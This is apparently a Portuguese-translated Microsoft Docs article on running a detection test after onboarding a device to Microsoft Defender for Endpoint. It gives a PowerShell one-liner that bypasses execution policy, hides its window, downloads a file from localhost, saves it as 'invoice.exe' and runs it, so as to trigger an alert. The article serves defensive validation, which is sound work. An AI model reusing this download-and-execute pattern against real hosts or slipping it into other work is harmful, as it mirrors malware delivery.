---
title: Executar um teste de detecção em um dispositivo recém-integrado do Microsoft Defender para Ponto de Extremidade
description: Execute o script de detecção em um dispositivo recém-integrado para verificar se ele está corretamente conectado ao serviço Microsoft Defender para Ponto de Extremidade.
keywords: teste de detecção, detecção, powershell, script, verificar, integração, microsoft defender para integração de ponto de extremidade, clientes, servidores, teste
search.product: eADQiWindows 10XVcnh
search.appverid: met150
ms.prod: m365-security
ms.mktglfcycl: deploy
ms.sitesec: library
ms.pagetype: security
ms.author: macapara
author: mjcaparas
localization_priority: Normal
manager: dansimp
audience: ITPro
ms.collection:
- m365-security-compliance
- m365initiative-defender-endpoint
ms.topic: article
ms.technology: mde
ms.openlocfilehash: 2bb1fde1bfd8ddfa358d1141c3821843e532a8bf
ms.sourcegitcommit: efb932db63ad3ab4af4b585428d567d069410e4e
ms.translationtype: MT
ms.contentlocale: pt-BR
ms.lasthandoff: 05/11/2021
ms.locfileid: "52311995"
---
# <a name="run-a-detection-test-on-a-newly-onboarded-microsoft-defender-for-endpoint-device"></a><span data-ttu-id="5739e-104">Executar um teste de detecção em um dispositivo recém-integrado do Microsoft Defender para Ponto de Extremidade</span><span class="sxs-lookup"><span data-stu-id="5739e-104">Run a detection test on a newly onboarded Microsoft Defender for Endpoint device</span></span> 

[!INCLUDE [Microsoft 365 Defender rebranding](../../includes/microsoft-defender.md)]


<span data-ttu-id="5739e-105">**Aplica-se a:**</span><span class="sxs-lookup"><span data-stu-id="5739e-105">**Applies to:**</span></span>
- <span data-ttu-id="5739e-106">Versões Windows 10 com suporte</span><span class="sxs-lookup"><span data-stu-id="5739e-106">Supported Windows 10 versions</span></span>
- <span data-ttu-id="5739e-107">Windows Server 2012 R2</span><span class="sxs-lookup"><span data-stu-id="5739e-107">Windows Server 2012 R2</span></span>
- <span data-ttu-id="5739e-108">Windows Server 2016</span><span class="sxs-lookup"><span data-stu-id="5739e-108">Windows Server 2016</span></span>
- <span data-ttu-id="5739e-109">Windows Servidor, versão 1803</span><span class="sxs-lookup"><span data-stu-id="5739e-109">Windows Server, version 1803</span></span>
- <span data-ttu-id="5739e-110">Windows Server, 2019</span><span class="sxs-lookup"><span data-stu-id="5739e-110">Windows Server, 2019</span></span>
- [<span data-ttu-id="5739e-111">Microsoft Defender para Ponto de Extremidade</span><span class="sxs-lookup"><span data-stu-id="5739e-111">Microsoft Defender for Endpoint</span></span>](https://go.microsoft.com/fwlink/?linkid=2154037)
- [<span data-ttu-id="5739e-112">Microsoft 365 Defender</span><span class="sxs-lookup"><span data-stu-id="5739e-112">Microsoft 365 Defender</span></span>](https://go.microsoft.com/fwlink/?linkid=2118804)

> <span data-ttu-id="5739e-113">Deseja experimentar o Microsoft Defender para Ponto de Extremidade?</span><span class="sxs-lookup"><span data-stu-id="5739e-113">Want to experience Microsoft Defender for Endpoint?</span></span> [<span data-ttu-id="5739e-114">Inscreva-se para uma avaliação gratuita.</span><span class="sxs-lookup"><span data-stu-id="5739e-114">Sign up for a free trial.</span></span>](https://www.microsoft.com/microsoft-365/windows/microsoft-defender-atp?ocid=docs-wdatp-exposedapis-abovefoldlink)

<span data-ttu-id="5739e-115">Execute o seguinte script do PowerShell em um dispositivo recém-conectado para verificar se ele está relatando corretamente para o serviço Defender para Ponto de Extremidade.</span><span class="sxs-lookup"><span data-stu-id="5739e-115">Run the following PowerShell script on a newly onboarded device to verify that it is properly reporting to the Defender for Endpoint service.</span></span>

1. <span data-ttu-id="5739e-116">Crie uma pasta: 'C:\test-MDATP-test'.</span><span class="sxs-lookup"><span data-stu-id="5739e-116">Create a folder:  'C:\test-MDATP-test'.</span></span>
2. <span data-ttu-id="5739e-117">Abra um prompt de linha de comando elevada no dispositivo e execute o script:</span><span class="sxs-lookup"><span data-stu-id="5739e-117">Open an elevated command-line prompt on the device and run the script:</span></span>

   1. <span data-ttu-id="5739e-118">Vá para **Iniciar** e digite **cmd**.</span><span class="sxs-lookup"><span data-stu-id="5739e-118">Go to **Start** and type **cmd**.</span></span>

   1. <span data-ttu-id="5739e-119">Clique com o botão direito do mouse **em Prompt de Comando** e selecione Executar como **administrador**.</span><span class="sxs-lookup"><span data-stu-id="5739e-119">Right-click **Command Prompt** and select **Run as administrator**.</span></span>

      ![Menu Iniciar janela apontando para Executar como administrador](images/run-as-admin.png)

3. <span data-ttu-id="5739e-121">No prompt, copie e execute o seguinte comando:</span><span class="sxs-lookup"><span data-stu-id="5739e-121">At the prompt, copy and run the following command:</span></span>

   ```powershell
   powershell.exe -NoExit -ExecutionPolicy Bypass -WindowStyle Hidden $ErrorActionPreference = 'silentlycontinue';(New-Object System.Net.WebClient).DownloadFile('http://127.0.0.1/1.exe', 'C:\\test-MDATP-test\\invoice.exe');Start-Process 'C:\\test-MDATP-test\\invoice.exe'
   ```

<span data-ttu-id="5739e-122">A janela prompt de comando será fechada automaticamente.</span><span class="sxs-lookup"><span data-stu-id="5739e-122">The Command Prompt window will close automatically.</span></span> <span data-ttu-id="5739e-123">Se bem-sucedido, o teste de detecção será marcado como concluído e um novo alerta aparecerá no portal do dispositivo conectado em aproximadamente 10 minutos.</span><span class="sxs-lookup"><span data-stu-id="5739e-123">If successful, the detection test will be marked as completed and a new alert will appear in the portal for the onboarded device in approximately 10 minutes.</span></span>

## <a name="related-topics"></a><span data-ttu-id="5739e-124">Tópicos relacionados</span><span class="sxs-lookup"><span data-stu-id="5739e-124">Related topics</span></span>
- [<span data-ttu-id="5739e-125">Dispositivos integrados do Windows 10</span><span class="sxs-lookup"><span data-stu-id="5739e-125">Onboard Windows 10 devices</span></span>](configure-endpoints.md)
- [<span data-ttu-id="5739e-126">Servidores de integração</span><span class="sxs-lookup"><span data-stu-id="5739e-126">Onboard servers</span></span>](configure-server-endpoints.md)
- [<span data-ttu-id="5739e-127">Solucionar problemas de integração do Microsoft Defender para pontos de extremidade</span><span class="sxs-lookup"><span data-stu-id="5739e-127">Troubleshoot Microsoft Defender for Endpoint onboarding issues</span></span>](https://docs.microsoft.com/microsoft-365/security/defender-endpoint/troubleshoot-onboarding)
